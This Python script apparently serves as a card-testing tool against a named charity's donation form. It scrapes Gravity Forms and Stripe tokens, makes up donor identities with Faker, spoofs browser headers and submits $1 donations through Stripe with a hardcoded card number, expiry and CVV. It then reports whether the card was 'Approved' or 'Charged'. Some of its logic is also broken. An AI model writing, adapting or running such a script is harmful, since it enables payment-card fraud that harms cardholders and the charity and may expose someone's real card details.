import requests
import random
import re
from faker import Faker
from fake_useragent import UserAgent

# ==========================================
# CONFIG
# ==========================================

BASE_URL = "https://crisisaid.org"
DONATE_URL = f"{BASE_URL}/donate/"
AJAX_URL = f"{BASE_URL}/wp-admin/admin-ajax.php"

fake = Faker()
session = requests.Session()
UA = UserAgent().random

# ==========================================
# RANDOM VALID US ADDRESS DATABASE
# ==========================================

VALID_US_ADDRESSES = [
    {"city": "New York", "state": "New York", "zipcode": "10001"},
    {"city": "Los Angeles", "state": "California", "zipcode": "90001"},
    {"city": "Chicago", "state": "Illinois", "zipcode": "60601"},
    {"city": "Houston", "state": "Texas", "zipcode": "77001"},
    {"city": "Phoenix", "state": "Arizona", "zipcode": "85001"},
    {"city": "Philadelphia", "state": "Pennsylvania", "zipcode": "19101"},
    {"city": "San Antonio", "state": "Texas", "zipcode": "78201"},
    {"city": "San Diego", "state": "California", "zipcode": "92101"},
    {"city": "Dallas", "state": "Texas", "zipcode": "75201"},
    {"city": "San Jose", "state": "California", "zipcode": "95101"},
    {"city": "Austin", "state": "Texas", "zipcode": "78701"},
    {"city": "Jacksonville", "state": "Florida", "zipcode": "32099"},
    {"city": "Fort Worth", "state": "Texas", "zipcode": "76102"},
    {"city": "Columbus", "state": "Ohio", "zipcode": "43085"},
    {"city": "Indianapolis", "state": "Indiana", "zipcode": "46204"},
    {"city": "Charlotte", "state": "North Carolina", "zipcode": "28202"},
    {"city": "Seattle", "state": "Washington", "zipcode": "98101"},
    {"city": "Denver", "state": "Colorado", "zipcode": "80202"},
    {"city": "Boston", "state": "Massachusetts", "zipcode": "02101"},
    {"city": "Miami", "state": "Florida", "zipcode": "33101"},
]

# ==========================================
# RANDOM USER GENERATION
# ==========================================

FIRST_NAME = fake.first_name()
LAST_NAME = fake.last_name()

EMAIL = fake.email()
PHONE = fake.numerify(text="##########")

ADDRESS = random.choice(VALID_US_ADDRESSES)

ADDRESS_1 = fake.street_address()
ADDRESS_2 = ""

CITY = ADDRESS["city"]
STATE = ADDRESS["state"]
ZIPCODE = ADDRESS["zipcode"]
COUNTRY = "United States"

# ==========================================
# DONATION CONFIG
# ==========================================

CURRENCY = "USD"
DONATION_TYPE = "one-time"

DONATION_AMOUNT = "$1.00"
FINAL_AMOUNT = "$1.03"

FEE_AMOUNT = "0.03"

DONATION_TARGET = "Where Needed Most"

TRACKING_ID = fake.lexify(text="????????")

# ==========================================
# HEADERS
# ==========================================

headers = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/146.0.0.0 Safari/537.36"
    ),
    "Accept": "*/*",
    "Origin": BASE_URL,
    "Referer": DONATE_URL,
}

# ==========================================
# STEP 1 — LOAD DONATION PAGE
# ==========================================

print("[+] Loading donation page...")

r = session.get(
    DONATE_URL,
    headers=headers,
)

html = r.text

# SAVE FULL HTML FOR DEBUGGING
with open("debug.html", "w", encoding="utf-8") as f:
    f.write(html)

print(f"[+] GET Status: {r.status_code}")

# ==========================================
# TOKEN EXTRACTION FUNCTION
# ==========================================

def extract(pattern, text, name, flags=re.S):
    match = re.search(pattern, text, flags)

    if not match:
        print(f"[-] Failed extracting: {name}")
        return None

    value = match.group(1)

    print(f"[+] {name}: {value}")

    return value

# ==========================================
# EXTRACT DYNAMIC TOKENS
# ==========================================

# FORM ID
FORM_ID = extract(
    r'new GFStripe\(\s*\{.*?"formId":(\d+)',
    html,
    "FORM_ID"
)

# FEED ID
FEED_ID = extract(
    r'"feedId":"(\d+)"',
    html,
    "FEED_ID"
)

# IMPORTANT STRIPE VALIDATION NONCE
NONCE = extract(
    r'"validate_form_nonce":"([^"]+)"',
    html,
    "NONCE"
)

# VERSION HASH
VERSION_HASH = extract(
    r'"version_hash":"([^"]+)"',
    html,
    "VERSION_HASH"
)

# OPTIONAL EXTRA NONCES
AJAX_SUBMISSION_NONCE = extract(
    r'"ajax_submission_nonce":"([^"]+)"',
    html,
    "AJAX_SUBMISSION_NONCE"
)

CONFIG_NONCE = extract(
    r'"config_nonce":"([^"]+)"',
    html,
    "CONFIG_NONCE"
)

# STATE TOKEN
STATE_1 = extract(
    r'name="state_1"\s+value=\'([^\']+)\'',
    html,
    "STATE_1"
)

if not STATE_1:
    STATE_1 = extract(
        r'name="state_1"\s+value="([^"]+)"',
        html,
        "STATE_1"
    )

# UNIQUE ID
GFORM_UNIQUE_ID = extract(
    r'name="gform_unique_id"\s+value=\'([^\']+)\'',
    html,
    "GFORM_UNIQUE_ID"
)

if not GFORM_UNIQUE_ID:
    GFORM_UNIQUE_ID = extract(
        r'name="gform_unique_id"\s+value="([^"]+)"',
        html,
        "GFORM_UNIQUE_ID"
    )

# AJAX HASH
AJAX_HASH = extract(
    r'hash=([a-f0-9]{32})',
    html,
    "AJAX_HASH"
)

# STRIPE PUBLIC KEY
STRIPE_PK = extract(
    r'"apiKey":"(pk_live_[^"]+)"',
    html,
    "STRIPE_PK"
)

# PAGE INSTANCE
PAGE_INSTANCE = extract(
    r'"pageInstance":(\d+)',
    html,
    "PAGE_INSTANCE"
)

print("\n[+] TOKEN EXTRACTION COMPLETE")

# ==========================================
# VALIDATION
# ==========================================

required_tokens = {
    "FORM_ID": FORM_ID,
    "FEED_ID": FEED_ID,
    "NONCE": NONCE,
    "VERSION_HASH": VERSION_HASH,
    "AJAX_HASH": AJAX_HASH,
}

missing = [k for k, v in required_tokens.items() if not v]

if missing:
    print(f"\n[-] Missing required tokens: {missing}")
    exit()

# ==========================================
# BUILD FORM DATA
# ==========================================

data = {
    "input_41": "USD",
    "input_11": "one-time",
    "input_3": "Other|0",
    "input_4": "$1.00",
    "input_10": "Where Needed Most",
    "input_26": "",

    "input_1.3": FIRST_NAME,
    "input_1.6": LAST_NAME,
    "input_2": EMAIL,
    "input_16": PHONE,

    "input_23.1": ADDRESS_1,
    "input_23.2": ADDRESS_2,
    "input_23.3": CITY,
    "input_23.4": STATE,
    "input_23.5": ZIPCODE,
    "input_23.6": COUNTRY,

    "input_39": "",
    "input_20": "$1.00",

    "input_42": DONATE_URL,
    "input_45": "0",

    "gform_submission_method": "iframe",
    "gform_theme": "gravity-theme",
    "gform_style_settings": "[]",

    "is_submit_1": "1",

    "gform_unique_id": GFORM_UNIQUE_ID,

    "state_1": STATE_1,

    "gform_target_page_number_1": "0",
    "gform_source_page_number_1": "4",

    "gform_field_values": "",

    "version_hash": VERSION_HASH,

    "gform_submission_speeds": (
        '{"pages":{"4":[85752]}}'
    ),

    "action": "gfstripe_validate_form",

    "feed_id": FEED_ID,
    "form_id": FORM_ID,

    "tracking_id": TRACKING_ID,

    "payment_method": "card",

    "nonce": NONCE,

    "gform_ajax--stripe-temp": (
        f"form_id={FORM_ID}"
        "&title="
        "&description="
        "&tabindex=0"
        "&theme=gravity-theme"
        "&styles=[]"
        f"&hash={AJAX_HASH}"
    ),
}

# ==========================================
# SEND VALIDATION REQUEST
# ==========================================

print("\n[+] Sending validation request...")

response = session.post(
    AJAX_URL,
    headers=headers,
    data=data,
)

for a in response.text:

    if a == '{"success":true,"data":{"is_valid":false}}':

        print('Failed at step 2')
        break
    

# ==========================================
# OUTPUT
# ==========================================

print("\n==============================")
print("STATUS:", response.status_code)
print("==============================\n")

print(response.text)

# ==========================================
# STEP 1.5 — FETCH PAYMENT INTENT DETAILS
# ==========================================

print("\n[+] Fetching payment intent details from validation response...")

CLIENT_SECRET = None
PAYMENT_INTENT_ID = None
RESUME_TOKEN = None

try:
    validation_response = response.json()
    
    # Extract resume token (available at top level of data)
    if "data" in validation_response:
        RESUME_TOKEN = validation_response["data"].get("resume_token")
        if RESUME_TOKEN:
            print(f"[+] Extracted Resume Token: {RESUME_TOKEN}")
    
    # Try to extract payment intent ID and client secret from nested response
    if "data" in validation_response and "intent" in validation_response["data"]:
        intent = validation_response["data"]["intent"]
        CLIENT_SECRET = intent.get("client_secret")
        PAYMENT_INTENT_ID = intent.get("id")
        
        if CLIENT_SECRET and PAYMENT_INTENT_ID:
            print(f"[+] Extracted Payment Intent ID: {PAYMENT_INTENT_ID}")
            print(f"[+] Extracted Client Secret: {CLIENT_SECRET[:50]}...")
        else:
            print("[-] Missing client_secret or payment_intent_id in validation response")
    else:
        print("[-] Unexpected validation response structure")
        
except Exception as e:
    print(f"[-] Error parsing validation response: {e}")

# Fallback to hardcoded values if extraction failed
if not CLIENT_SECRET or not PAYMENT_INTENT_ID:
    print("[-] Using fallback hardcoded values")
    PAYMENT_INTENT_ID = "pi_fallback_value"
    CLIENT_SECRET = "pi_fallback_value_secret_fallback"

if not RESUME_TOKEN:
    print("[-] Using fallback hardcoded RESUME_TOKEN")
    RESUME_TOKEN = "fallback_resume_token"

# ========== FETCH PAYMENT INTENT ==========
print("\n[+] Retrieving full payment intent details...")

fetch_headers = {
    'Host': 'api.stripe.com',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Sec-Ch-Ua-Platform': '"Linux"',
    'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': UA,
    'Origin': 'https://js.stripe.com',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://js.stripe.com/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Priority': 'u=1, i'
}

fetch_params = {
    'is_stripe_sdk': 'false',
    'client_secret': CLIENT_SECRET,
    'key': STRIPE_PK,
}

fetch_url = f"https://api.stripe.com/v1/payment_intents/{PAYMENT_INTENT_ID}"

fetch_response = session.get(
    fetch_url,
    headers=fetch_headers,
    params=fetch_params,
    timeout=30
)

# ========== INITIALIZE INTENT VARIABLES ==========
INTENT_ID = None
INTENT_STATUS = None
INTENT_AMOUNT = None
INTENT_CURRENCY = None
PAYMENT_METHOD_ID = None

print(f"[+] Fetch Status: {fetch_response.status_code}")

if fetch_response.status_code == 200:
    intent_data = fetch_response.json()
    
    # ========== EXTRACT CRITICAL FIELDS ==========
    INTENT_ID = intent_data.get("id")
    INTENT_STATUS = intent_data.get("status")
    INTENT_AMOUNT = intent_data.get("amount")
    INTENT_CURRENCY = intent_data.get("currency")
    PAYMENT_METHOD_ID = None
    
    if "last_payment_error" in intent_data and intent_data["last_payment_error"]:
        error = intent_data["last_payment_error"]
        if "payment_method" in error and error["payment_method"]:
            PAYMENT_METHOD_ID = error["payment_method"].get("id")
    
    if "payment_method" in intent_data and intent_data["payment_method"]:
        PAYMENT_METHOD_ID = intent_data["payment_method"].get("id")
    
    # ========== PRINT EXTRACTED DATA ==========
    print(f"\n[+] Payment Intent Details:")
    print(f"    - Intent ID: {INTENT_ID}")
    print(f"    - Status: {INTENT_STATUS}")
    print(f"    - Amount: {INTENT_AMOUNT} {INTENT_CURRENCY.upper()}")
    print(f"    - Payment Method ID: {PAYMENT_METHOD_ID}")
    
    if intent_data.get("last_payment_error"):
        print(f"\n[!] Last Payment Error:")
        print(f"    - Code: {intent_data['last_payment_error'].get('code')}")
        print(f"    - Message: {intent_data['last_payment_error'].get('message')}")
    
else:
    print(f"[-] Failed to fetch payment intent: {fetch_response.text}")
    print("[-] Using fallback PAYMENT_INTENT_ID for confirmation step")


# ========== FETCH ELEMENTS SESSION ==========
print("\n[+] Fetching Elements Session ID...")

elements_params = {
    'deferred_intent[mode]': 'payment',
    'deferred_intent[amount]': INTENT_AMOUNT or '100',
    'deferred_intent[currency]': INTENT_CURRENCY or 'usd',
    'deferred_intent[capture_method]': 'automatic',
    'deferred_intent[payment_method_options][us_bank_account][verification_method]': 'instant',
    'currency': 'usd',
    'key': STRIPE_PK,
    'elements_init_source': 'stripe.elements',
    'referrer_host': 'crisisaid.org',
    'stripe_js_id': '6179ea79-3e8a-42e4-bd0c-e0ebf91cfa8b',
    'locale': 'en-US',
    'type': 'deferred_intent',
}

elements_response = session.get(
    'https://api.stripe.com/v1/elements/sessions',
    headers=fetch_headers,
    params=elements_params,
    timeout=30
)

ELEMENTS_SESSION_ID = None

if elements_response.status_code == 200:
    elements_data = elements_response.json()
    ELEMENTS_SESSION_ID = elements_data.get("session_id")
    LINK_HCAPTCHA_RQDATA = elements_data.get("link_hcaptcha_rqdata")
    LINK_HCAPTCHA_SITE_KEY = elements_data.get("link_hcaptcha_site_key")
    
    if ELEMENTS_SESSION_ID:
        print(f"[+] Extracted Elements Session ID: {ELEMENTS_SESSION_ID}")
    else:
        print("[-] No session_id in elements response")
    
    if LINK_HCAPTCHA_RQDATA:
        print(f"[+] Extracted Link hCaptcha RQData: {LINK_HCAPTCHA_RQDATA[:50]}...")
    else:
        print("[-] No link_hcaptcha_rqdata in elements response")
    
    if LINK_HCAPTCHA_SITE_KEY:
        print(f"[+] Extracted Link hCaptcha Site Key: {LINK_HCAPTCHA_SITE_KEY}")
    else:
        print("[-] No link_hcaptcha_site_key in elements response")
else:
    print(f"[-] Failed to fetch elements session: {elements_response.status_code}")
    print(f"[-] Response: {elements_response.text}")

# Fallback to hardcoded values if extraction failed
if not ELEMENTS_SESSION_ID:
    print("[-] Using fallback hardcoded ELEMENTS_SESSION_ID")
    ELEMENTS_SESSION_ID = "elements_session_fallback"

if not LINK_HCAPTCHA_RQDATA:
    print("[-] Using fallback hardcoded LINK_HCAPTCHA_RQDATA")
    LINK_HCAPTCHA_RQDATA = "fallback_rqdata"

if not LINK_HCAPTCHA_SITE_KEY:
    print("[-] Using fallback hardcoded LINK_HCAPTCHA_SITE_KEY")
    LINK_HCAPTCHA_SITE_KEY = "fallback_site_key"


num = '5575191860159004'
mm = '05'
yy = '28'
cvv = '630'

# ==========================================
# STEP 2 — SUBMIT PAYMENT INTENT CONFIRMATION
# ==========================================

print("\n[+] === STEP 2: PAYMENT CONFIRMATION ===")

# ========== VALIDATION CHECK ==========
if not PAYMENT_INTENT_ID or not CLIENT_SECRET:
    print("[-] Missing required payment intent data (PAYMENT_INTENT_ID or CLIENT_SECRET)")
    print("[-] Cannot proceed with payment confirmation")
    print("[-] Exiting...")
    exit(1)

print(f"[+] Using Payment Intent ID: {PAYMENT_INTENT_ID}")
print(f"[+] Using Client Secret: {CLIENT_SECRET[:50]}...")

# ========== EXTRACT PAYMENT INTENT DATA ==========



# ========== STRIPE CONFIRMATION ENDPOINT ==========
CONFIRM_ENDPOINT = f"https://api.stripe.com/v1/payment_intents/{PAYMENT_INTENT_ID}/confirm"

# ========== CONFIRMATION HEADERS ==========
confirm_headers = {
    'Host': 'api.stripe.com',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept': 'application/json',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Sec-Ch-Ua-Platform': '"Linux"',
    'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': UA,
    'Origin': 'https://js.stripe.com',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://js.stripe.com/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Priority': 'u=1, i'
}

# ========== CONFIRMATION PAYLOAD ==========
confirm_data = {
    'return_url': f'{DONATE_URL}?resume_token={RESUME_TOKEN}&feed_id={FEED_ID}&form_id={FORM_ID}&tracking_id={TRACKING_ID}',
    'payment_method_data[billing_details][address][line1]': ADDRESS_1,
    'payment_method_data[billing_details][address][line2]': ADDRESS_2,
    'payment_method_data[billing_details][address][city]': CITY,
    'payment_method_data[billing_details][address][state]': STATE,
    'payment_method_data[billing_details][address][postal_code]': ZIPCODE,
    'payment_method_data[billing_details][address][country]': 'US',
    'payment_method_data[billing_details][email]': EMAIL,
    'payment_method_data[type]': 'card',
    'payment_method_data[card][number]': num,
    'payment_method_data[card][cvc]': cvv,
    'payment_method_data[card][exp_year]': yy,
    'payment_method_data[card][exp_month]': mm,
    'payment_method_data[allow_redisplay]': 'unspecified',
    'payment_method_data[pasted_fields]': 'number,exp',
    'payment_method_data[payment_user_agent]': 'stripe.js/035decdc6c; stripe-js-v3/035decdc6c; payment-element; deferred-intent; autopm',
    'payment_method_data[referrer]': DONATE_URL,
    'payment_method_data[time_on_page]': '674786',
    'payment_method_data[client_attribution_metadata][client_session_id]': '6179ea79-3e8a-42e4-bd0c-e0ebf91cfa8b',
    'payment_method_data[client_attribution_metadata][merchant_integration_source]': 'elements',
    'payment_method_data[client_attribution_metadata][merchant_integration_subtype]': 'payment-element',
    'payment_method_data[client_attribution_metadata][merchant_integration_version]': '2021',
    'payment_method_data[client_attribution_metadata][payment_intent_creation_flow]': 'deferred',
    'payment_method_data[client_attribution_metadata][payment_method_selection_flow]': 'automatic',
    'payment_method_data[client_attribution_metadata][elements_session_id]': ELEMENTS_SESSION_ID,
    'payment_method_data[client_attribution_metadata][elements_session_config_id]': '6d7deefc-2e00-4c4e-8834-a937648ef685',
    'payment_method_data[guid]': '26b72a95-017d-4225-bfa5-cdcf1df64d08bd4269',
    'payment_method_data[muid]': 'a7eea91e-8475-4b85-91dc-08e6c6f1d42f5bb610',
    'payment_method_data[sid]': '09563e8e-8f32-4e51-be13-3921fa5ca45e5070dd',
    'expected_payment_method_type': 'card',
    'client_context[currency]': 'usd',
    'client_context[mode]': 'payment',
    'client_context[capture_method]': 'automatic',
    'radar_options[hcaptcha_token]': LINK_HCAPTCHA_RQDATA,
    'use_stripe_sdk': 'true',
    'key': STRIPE_PK,
    'client_secret': CLIENT_SECRET,
}

# ========== SUBMIT CONFIRMATION ==========
print("\n[+] Submitting Stripe payment confirmation...")

confirm_response = session.post(
    CONFIRM_ENDPOINT,
    headers=confirm_headers,
    data=confirm_data,
    timeout=30
)

print(f"\n[+] Confirmation Status: {confirm_response.status_code}")
print(confirm_response.json() if confirm_response.status_code in [200, 201] else confirm_response.text)

    
try:

    if 'requires_action' in confirm_response.text:

        status = 'Success'

        response = '3Ds Required'

        message = 'requires_action'

    if 'approved' in confirm_response.text or 'Approved' in confirm_response.text:

        status = 'Success'

        response = 'Approved'

        message = 'Card Approved'

    if 'charged' in confirm_response.text or 'Charged' in confirm_response.text:

        status = 'Success'

        response = 'Charged'

        message = 'Card Charged'


except Exception as e:
    print(e)

finally:

    print(response, status, message)
